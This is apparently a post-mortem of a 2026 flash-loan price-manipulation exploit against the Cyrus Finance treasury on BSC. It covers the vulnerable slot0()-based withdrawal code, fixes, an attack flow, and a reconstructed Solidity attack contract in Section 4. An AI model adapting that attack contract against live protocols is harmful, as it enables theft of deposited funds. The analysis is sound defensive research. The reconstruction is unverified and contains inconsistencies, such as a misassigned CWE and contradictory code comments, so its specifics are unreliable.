# Cyrus Finance — Spot Price Manipulation-Based Liquidity Over-Withdrawal Analysis

| Field | Details |
|------|------|
| **Date** | 2026-03-22 |
| **Protocol** | Cyrus Finance |
| **Chain** | BSC (BNB Smart Chain) |
| **Loss** | ~$512,000 USDT |
| **Attacker** | [Address unconfirmed](https://bscscan.com/address/) |
| **Attack Contract** | [Address unconfirmed](https://bscscan.com/address/) |
| **Attack Tx** | [0x2b7efdac...456e47b9](https://bscscan.com/tx/0x2b7efdac5f052ee9a8a4b58fb5f5d1c09e4a28d9498a59f1ef5f5b39456e47b9) |
| **Vulnerable Contract** | [CyrusTreasury: 0xb042Ea7b...50aE10b](https://bscscan.com/address/0xb042Ea7b35826e6e537a63bb9fc9fb06b50aE10b) |
| **Root Cause** | `slot0()` spot price dependency in `withdrawUSDTFromAny()` → price manipulable within the same transaction (Business Logic Flaw) |
| **PoC Source** | [DeFiHackLabs](https://github.com/SunWeb3Sec/DeFiHackLabs) (not included in 2026-03 — reconstructed from web research) |

---

## 1. Vulnerability Overview

Cyrus Finance is a yield farming protocol operating on BSC that represents shares in PancakeSwap V3 concentrated liquidity positions via CYRP NFT positions. Users can withdraw their deposited USDT by passing their NFT position to the `exit()` function.

The core vulnerability exists in the `withdrawUSDTFromAny()` function — the withdrawal logic of the `CyrusTreasury` contract. This function reads the current spot price (`sqrtPriceX96`) from PancakeSwap V3 pool's `slot0()` function **to determine how much liquidity to remove**. `slot0()` is not manipulation-resistant and can be instantly skewed within the same transaction via a large swap.

The attacker used flash-loaned funds to artificially move the pool price, then called `exit()`, inducing the protocol to withdraw far more USDT than the actual fair value of the NFT share. As a result, approximately **$512,000 worth of USDT** was illicitly drained.

---

## 2. Vulnerable Code Analysis

### 2.1 `withdrawUSDTFromAny()` — Liquidity Calculation Based on Spot Price (Core Vulnerability)

#### ❌ Vulnerable Code

```solidity
// CyrusTreasury.sol (estimated reconstruction)

function withdrawUSDTFromAny(uint256 tokenId, uint256 remaining) internal {
    // ❌ [Vulnerable Point 1] Reads current spot price from slot0()
    //    slot0() can be instantly manipulated via a swap in the same transaction
    (uint160 sqrtPriceX96, , , , , , ) = pancakeV3Pool.slot0();

    // ❌ [Vulnerable Point 2] Estimates USDT value of total pool liquidity using the manipulated spot price
    //    If the price is distorted, availableUSDT is calculated abnormally large
    (uint256 amount0, uint256 amount1) = LiquidityAmounts.getAmountsForLiquidity(
        sqrtPriceX96,
        sqrtRatioAX96,   // position lower tick
        sqrtRatioBX96,   // position upper tick
        totalPositionLiquidity
    );
    uint256 availableUSDT = amount0 + amount1; // total value denominated in USDT

    // ❌ [Vulnerable Point 3] Back-calculates liquidity to remove based on manipulated availableUSDT
    //    With remaining as a fixed value, a larger availableUSDT reduces liquidityToUse,
    //    but the spot price distortion causes the actual withdrawal to far exceed fair value
    uint128 liquidityToUse = uint128(
        uint256(totalPositionLiquidity) * remaining / availableUSDT
    );

    // Remove liquidity and collect tokens
    INonfungiblePositionManager(nftManager).decreaseLiquidity(
        INonfungiblePositionManager.DecreaseLiquidityParams({
            tokenId: protocolTokenId,
            liquidity: liquidityToUse,
            amount0Min: 0,
            amount1Min: 0,   // ❌ No slippage protection
            deadline: block.timestamp
        })
    );

    INonfungiblePositionManager(nftManager).collect(
        INonfungiblePositionManager.CollectParams({
            tokenId: protocolTokenId,
            recipient: address(this),
            amount0Max: type(uint128).max,
            amount1Max: type(uint128).max
        })
    );
}

// exit() — user-facing entry point
function exit(uint256 nftId) external {
    // Validate the user's CYRP NFT position
    require(ownerOf(nftId) == msg.sender, "not owner");
    uint256 userShare = getShareOf(nftId); // Query NFT share

    // ❌ Under the manipulated spot price, far more USDT than fair value is withdrawn
    withdrawUSDTFromAny(nftId, userShare);

    // Transfer USDT to user
    USDT.transfer(msg.sender, USDT.balanceOf(address(this)));
}
```

#### ✅ Fixed Code

```solidity
// CyrusTreasury.sol — fixed version

// ✅ [Fix 1] Add internal function that uses TWAP price
function getTWAPSqrtPriceX96(uint32 twapInterval) internal view returns (uint160) {
    uint32[] memory secondsAgos = new uint32[](2);
    secondsAgos[0] = twapInterval; // e.g., 1800 seconds (30 minutes) ago
    secondsAgos[1] = 0;

    (int56[] memory tickCumulatives, ) = pancakeV3Pool.observe(secondsAgos);
    int24 avgTick = int24(
        (tickCumulatives[1] - tickCumulatives[0]) / int56(uint56(twapInterval))
    );
    return TickMath.getSqrtRatioAtTick(avgTick);
}

function withdrawUSDTFromAny(uint256 tokenId, uint256 remaining) internal {
    // ✅ [Fix 1] Use TWAP-based manipulation-resistant price (30-minute average)
    uint160 sqrtPriceX96 = getTWAPSqrtPriceX96(1800);

    // ✅ [Fix 2] Estimate liquidity value using TWAP price (not manipulable)
    (uint256 amount0, uint256 amount1) = LiquidityAmounts.getAmountsForLiquidity(
        sqrtPriceX96,
        sqrtRatioAX96,
        sqrtRatioBX96,
        totalPositionLiquidity
    );
    uint256 availableUSDT = amount0 + amount1;

    uint128 liquidityToUse = uint128(
        uint256(totalPositionLiquidity) * remaining / availableUSDT
    );

    // ✅ [Fix 3] Add slippage protection — specify minimum received amounts
    uint256 minAmount = (remaining * 99) / 100; // 1% slippage tolerance
    INonfungiblePositionManager(nftManager).decreaseLiquidity(
        INonfungiblePositionManager.DecreaseLiquidityParams({
            tokenId: protocolTokenId,
            liquidity: liquidityToUse,
            amount0Min: 0,
            amount1Min: minAmount, // ✅ Slippage protection
            deadline: block.timestamp
        })
    );

    INonfungiblePositionManager(nftManager).collect(
        INonfungiblePositionManager.CollectParams({
            tokenId: protocolTokenId,
            recipient: address(this),
            amount0Max: type(uint128).max,
            amount1Max: type(uint128).max
        })
    );
}
```

**Issue Summary**: The spot price read from `slot0()` can be moved by tens of ticks or more within the same transaction via a flash loan swap. This causes `getAmountsForLiquidity()` to return an abnormally large `availableUSDT`, ultimately leading the protocol to remove far more liquidity than the fair value of the NFT share and overpay the attacker.

---

## 3. Attack Flow

### 3.1 Preparation Phase

- The attacker pre-acquired or already held CYRP NFT position (#15505) in Cyrus Finance
- Attack contract deployed

### 3.2 Execution Phase

```
┌─────────────────────────────────────────────────────────┐
│                    Attacker (EOA)                        │
│              Sends attack() transaction                   │
└──────────────────────────┬──────────────────────────────┘
                           │
                           ▼
┌─────────────────────────────────────────────────────────┐
│              Attack Contract                              │
│   (1) Requests flash loan from PancakeSwap V3            │
│       Borrows ~1,798 ETH equivalent                       │
└──────────────────────────┬──────────────────────────────┘
                           │
                           ▼
┌─────────────────────────────────────────────────────────┐
│           PancakeSwap V3 BCE-USDT Pool                   │
│   (2) Executes large ETH→USDT swap                       │
│       Artificially moves sqrtPriceX96 (slot0)            │
│       → Deviates tens of ticks from normal               │
└──────────────────────────┬──────────────────────────────┘
                           │ Manipulated spot price
                           ▼
┌─────────────────────────────────────────────────────────┐
│             CyrusTreasury Contract                        │
│   (3) Calls exit(15505)                                  │
│       └─ Executes withdrawUSDTFromAny()                  │
│           └─ Reads slot0() → obtains manipulated sqrtPriceX96 │
│           └─ Calls getAmountsForLiquidity()              │
│               → availableUSDT grossly overestimated (multiple-fold inflation) │
│           └─ Back-calculates liquidityToUse → excess liquidity removed │
│           └─ decreaseLiquidity() + collect()             │
│               → Receives USDT far exceeding fair value   │
└──────────────────────────┬──────────────────────────────┘
                           │ ~$512K USDT
                           ▼
┌─────────────────────────────────────────────────────────┐
│              Attack Contract                              │
│   (4) Reverse swap USDT→ETH to restore pool price       │
│   (5) Repays flash loan principal + fee                  │
│   (6) Sends net profit (~$512K) to attacker EOA          │
└─────────────────────────────────────────────────────────┘
```

### 3.3 Outcome

- **Attacker net profit**: ~$512,000 USDT
- **Protocol loss**: ~$512,000 USDT (drained from CyrusTreasury liquidity pool)
- **Flash loan source**: PancakeSwap V3
- **Transactions required**: 1 (completed within a single atomic transaction)

---

## 4. PoC Code Excerpt (Reconstructed — Not in Official DeFiHackLabs)

> No official PoC for this incident exists in the DeFiHackLabs repository; reconstructed from collected information.

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

// Reconstructed attack PoC — for educational purposes

interface IPancakeV3Pool {
    // Vulnerable function exposing spot price (manipulable)
    function slot0() external view returns (
        uint160 sqrtPriceX96, int24 tick, uint16 observationIndex,
        uint16 observationCardinality, uint16 observationCardinalityNext,
        uint32 feeProtocol, bool unlocked
    );
    // Execute flash loan
    function flash(address recipient, uint256 amount0, uint256 amount1, bytes calldata data) external;
    // Execute swap (used for price manipulation)
    function swap(
        address recipient, bool zeroForOne, int256 amountSpecified,
        uint160 sqrtPriceLimitX96, bytes calldata data
    ) external returns (int256 amount0, int256 amount1);
}

interface ICyrusTreasury {
    // Vulnerable withdrawal function: internally uses slot0()-based price calculation
    function exit(uint256 nftId) external;
}

interface IERC721 {
    function transferFrom(address from, address to, uint256 tokenId) external;
}

contract CyrusFinanceAttack {
    IPancakeV3Pool constant PCSV3_POOL =
        IPancakeV3Pool(0x...); // BCE-USDT PancakeSwap V3 pool
    ICyrusTreasury constant TREASURY =
        ICyrusTreasury(0xb042Ea7b35826e6e537a63bb9fc9fb06b50aE10b);
    IERC721 constant CYRP_NFT = IERC721(0x...); // CYRP NFT contract
    IERC20 constant USDT = IERC20(0x55d398326f99059fF775485246999027B3197955);

    uint256 constant TARGET_NFT_ID = 15505; // NFT position ID used in the attack

    function attack() external {
        // [Step 1] Transfer CYRP NFT to attack contract
        CYRP_NFT.transferFrom(msg.sender, address(this), TARGET_NFT_ID);

        // [Step 2] Request flash loan from PancakeSwap V3 (~1,798 ETH equivalent)
        PCSV3_POOL.flash(
            address(this),
            0,                       // amount0 (token0 = 0)
            1_798 ether,             // amount1 (ETH equivalent)
            abi.encode(msg.sender)   // include attacker address in callback data
        );
    }

    // [Step 3] Flash loan callback — executes the actual attack
    function pancakeV3FlashCallback(
        uint256 fee0,
        uint256 fee1,
        bytes calldata data
    ) external {
        address attacker = abi.decode(data, (address));

        // [3-1] Manipulate pool price via large swap (ETH→USDT direction)
        // Artificially moves sqrtPriceX96 in slot0()
        PCSV3_POOL.swap(
            address(this),
            false,              // zeroForOne=false: token1→token0 direction swap
            int256(1_798 ether), // swap the entire borrowed amount
            MAX_SQRT_RATIO - 1,  // move price as far as possible
            bytes("")
        );

        // [3-2] Call exit() under manipulated slot0() price
        //       CyrusTreasury reads slot0() and overpays USDT vs. fair value
        TREASURY.exit(TARGET_NFT_ID);

        // [3-3] Reverse swap to restore price (optional)
        // PCSV3_POOL.swap(...);

        // [3-4] Repay flash loan principal + fee
        uint256 repayAmount = 1_798 ether + fee1;
        WETH.transfer(address(PCSV3_POOL), repayAmount);

        // [3-5] Transfer obtained USDT to attacker
        uint256 profit = USDT.balanceOf(address(this));
        USDT.transfer(attacker, profit);
        // profit ≈ $512,000
    }
}
```

---

## 5. Vulnerability Classification

| ID | Vulnerability | Severity | CWE |
|----|--------|--------|-----|
| V-01 | Spot price oracle dependency (`slot0()` manipulable) | CRITICAL | CWE-20 (Improper Input Validation) |
| V-02 | No defense against flash loan price manipulation | CRITICAL | CWE-682 (Incorrect Calculation) |
| V-03 | Missing slippage protection (`amount0Min/1Min = 0`) | HIGH | CWE-119 (Improper Restriction of Buffer Bounds) |
| V-04 | Atomic manipulation-withdrawal within a single transaction allowed | HIGH | CWE-362 (Race Condition) |

---

### V-01: Spot Price Oracle Dependency (`slot0()` Manipulable)

- **Description**: The `withdrawUSDTFromAny()` function uses `sqrtPriceX96` read from PancakeSwap V3's `slot0()` to calculate the USDT value of the liquidity. `slot0()` returns the latest spot price in the current block and can be instantly manipulated within the same transaction by a large swap funded via a flash loan.
- **Impact**: The attacker artificially moves the price to make `getAmountsForLiquidity()` return an inflated `availableUSDT`, causing the protocol to withdraw far more USDT than the fair value of the NFT share.
- **Attack Conditions**: (1) Attacker holds a CYRP NFT position, (2) sufficient liquidity for a large swap (solved via flash loan), (3) atomic execution within a single transaction

---

### V-02: No Defense Against Flash Loan Price Manipulation

- **Description**: The protocol has no mechanism to detect or block price manipulation. There is no deviation check against a TWAP oracle or external price feed.
- **Impact**: An attacker using a flash loan can manipulate the price at virtually zero cost and atomically extract profit.
- **Attack Conditions**: Sufficient liquidity in the PancakeSwap V3 pool, flash loan access available

---

### V-03: Missing Slippage Protection

- **Description**: `amount0Min` and `amount1Min` are set to 0 in the `decreaseLiquidity()` call, meaning there is no minimum received amount validation.
- **Impact**: Potential for additional losses via sandwich attacks and MEV bots.
- **Attack Conditions**: Active MEV bot environment

---

### V-04: Atomic Manipulation-Withdrawal Within a Single Transaction Allowed

- **Description**: Price manipulation and profit extraction complete within the same atomic transaction, meaning the attacker only bears the flash loan cost when the price reverts.
- **Impact**: The attacker's net cost is only the flash loan fee (0.05–0.3%), making the attack extremely profitable.
- **Attack Conditions**: Atomic execution via smart contract

---

## 6. Remediation Recommendations

### Immediate Actions

#### 1) Use TWAP Price Instead of `slot0()`

```solidity
// ✅ Calculate manipulation-resistant price using 30-minute TWAP
function _getTWAPSqrtPriceX96() internal view returns (uint160) {
    uint32 twapInterval = 1800; // 30 minutes — realistically raises manipulation cost
    uint32[] memory secondsAgos = new uint32[](2);
    secondsAgos[0] = twapInterval;
    secondsAgos[1] = 0;

    (int56[] memory tickCumulatives, ) = pancakeV3Pool.observe(secondsAgos);
    int24 avgTick = int24(
        (tickCumulatives[1] - tickCumulatives[0]) / int56(uint56(twapInterval))
    );
    return TickMath.getSqrtRatioAtTick(avgTick);
}
```

#### 2) Spot Price vs. TWAP Deviation Check

```solidity
// ✅ Block withdrawals if spot price deviates more than X% from TWAP
function _assertPriceNotManipulated() internal view {
    (uint160 spotPrice, , , , , , ) = pancakeV3Pool.slot0();
    uint160 twapPrice = _getTWAPSqrtPriceX96();

    // Revert if price deviation exceeds 2%
    uint256 deviation = spotPrice > twapPrice
        ? ((uint256(spotPrice) - uint256(twapPrice)) * 100) / uint256(twapPrice)
        : ((uint256(twapPrice) - uint256(spotPrice)) * 100) / uint256(twapPrice);

    require(deviation <= 2, "CyrusTreasury: price manipulation detected");
}
```

#### 3) Add Slippage Protection

```solidity
// ✅ Specify minimum received amounts to defend against sandwich attacks
nftManager.decreaseLiquidity(
    INonfungiblePositionManager.DecreaseLiquidityParams({
        tokenId: protocolTokenId,
        liquidity: liquidityToUse,
        amount0Min: expectedAmount0 * 99 / 100, // ✅ 1% slippage tolerance
        amount1Min: expectedAmount1 * 99 / 100, // ✅ 1% slippage tolerance
        deadline: block.timestamp + 300
    })
);
```

### Structural Improvements

| Vulnerability | Recommended Action |
|--------|-----------|
| V-01: `slot0()` dependency | Replace with TWAP (minimum 1800 seconds) or Chainlink oracle |
| V-02: No defense against price manipulation | Add spot-TWAP deviation threshold check (≤2%) |
| V-03: Missing slippage | Specify `amount0Min/1Min` in `decreaseLiquidity()` calls |
| V-04: Atomicity abuse | Apply `nonReentrant` to withdrawals, consider block delay (lock-up) |
| General | Consider using Uniswap V3 `OracleLibrary.consult()` pattern |

---

## 7. Lessons Learned

1. **Never use DEX `slot0()` as a price oracle**: The current spot price of an AMM can be instantly manipulated via flash loans at near-zero collateral cost. Any logic dependent on prices — liquidity valuation, collateral assessment, liquidation decisions — must use TWAP or an external oracle such as Chainlink.

2. **TWAP window length is directly tied to attack cost**: A 30-second TWAP window can be manipulated with a flash loan. Use a minimum of 10 minutes (600 seconds), ideally 30 minutes (1800 seconds) or more. The longer the window, the exponentially greater the sustained manipulation cost for the attacker.

3. **Leverage PancakeSwap V3 / Uniswap V3 `OracleLibrary.consult()`**: V3 pools have built-in cumulative tick (`tickCumulative`) observation functionality. The `OracleLibrary.consult(pool, period)` pattern can be used to safely retrieve TWAP.

4. **Concentrated Liquidity is more susceptible to price manipulation**: V3's concentrated liquidity allows much larger price movements with far less capital within a narrow tick range. V3-based protocols should use longer TWAP windows than V2.

5. **Slippage protection is a requirement, not an option**: Failing to specify minimum received amount parameters in external protocol calls (`decreaseLiquidity`, `swap`, etc.) exposes the protocol to MEV bots and sandwich attacks.

6. **Audit similar architectures collectively**: When the `slot0()` dependency pattern is found in protocols built on PancakeSwap V3 or Uniswap V3, it should be immediately classified as a vulnerability and audited.

---

## 8. On-Chain Verification

> On-chain verification via the official `cast` tool was not performed (RPC environment not configured).
> The information below is based on collected security research reports (BlockSec, SmartContractHacking).

### 8.1 PoC vs. Research-Based Amount Comparison

| Field | Reconstructed PoC Value | Research-Reported Value | Notes |
|------|-------------|-------------|------|
| Flash loan amount | ~1,798 ETH | ~1,798 ETH | Match |
| Net profit (USDT) | ~$512,000 | ~$512,000 | Match |
| Target NFT ID | #15505 | #15505 | Match |
| Vulnerable function | `exit()` / `withdrawUSDTFromAny()` | `exit(15505)` / `withdrawUSDTFromAny()` | Match |

### 8.2 Key On-Chain Event Sequence (Estimated)

```
1. FlashLoan(recipient=attack_contract, amount=~1,798ETH)
2. Swap(zeroForOne=false, amount=~1,798ETH)  ← price manipulation
3. Transfer(from=CyrusTreasury, to=attack_contract, value=~$512K USDT)  ← excess withdrawal
4. [Swap reverse direction, optional]  ← price restoration
5. Transfer(from=attack_contract, to=PancakeSwapV3, value=flash_loan_repayment)
6. Transfer(from=attack_contract, to=attacker_EOA, value=~$512K USDT)
```

### 8.3 Preconditions (Estimated State Immediately Before Attack)

| Condition | Details |
|------|------|
| CYRP NFT #15505 owner | Attack contract (or transferred from attacker EOA) |
| CyrusTreasury USDT balance | ~$512K or more (deposited funds in liquidity pool) |
| PancakeSwap V3 pool liquidity | Sufficient to provide flash loan of ~1,798 ETH |

---

## References

- [BlockSec Weekly Roundup Mar 23–29, 2026](https://blocksec.com/blog/weekly-web3-security-incident-roundup-mar-23-mar-29-2026)
- [SmartContractHacking — Cyrus Finance Hack 2026](https://smartcontractshacking.com/hacks/cyrus-finance-hack-2026)
- [CyrusTreasury Vulnerable Contract](https://bscscan.com/address/0xb042Ea7b35826e6e537a63bb9fc9fb06b50aE10b)
- [Attack Transaction](https://bscscan.com/tx/0x2b7efdac5f052ee9a8a4b58fb5f5d1c09e4a28d9498a59f1ef5f5b39456e47b9)
- [Pattern Reference: 02_flash_loan.md — Spot Price Dependency](../patterns/02_flash_loan.md)
- [Pattern Reference: 04_oracle_manipulation.md — slot0 Manipulation](../patterns/04_oracle_manipulation.md)